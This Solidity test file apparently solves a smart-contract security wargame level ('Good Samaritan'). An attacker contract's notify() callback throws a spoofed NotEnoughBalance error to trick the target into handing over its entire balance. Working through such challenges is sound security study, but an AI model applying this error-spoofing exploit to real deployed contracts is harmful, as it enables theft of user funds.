// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {GoodSamaritan, Coin, Wallet} from "../instances/Ilevel27.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        GoodSamaritan good = new GoodSamaritan();
        BadSamaritan bad = new BadSamaritan(address(good));
        bad.attax();
        vm.stopBroadcast();
    }
}

contract BadSamaritan {
    error NotEnoughBalance();

    GoodSamaritan goodsamaritan;

    constructor(address good) {
        goodsamaritan = GoodSamaritan(good);
    }

    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
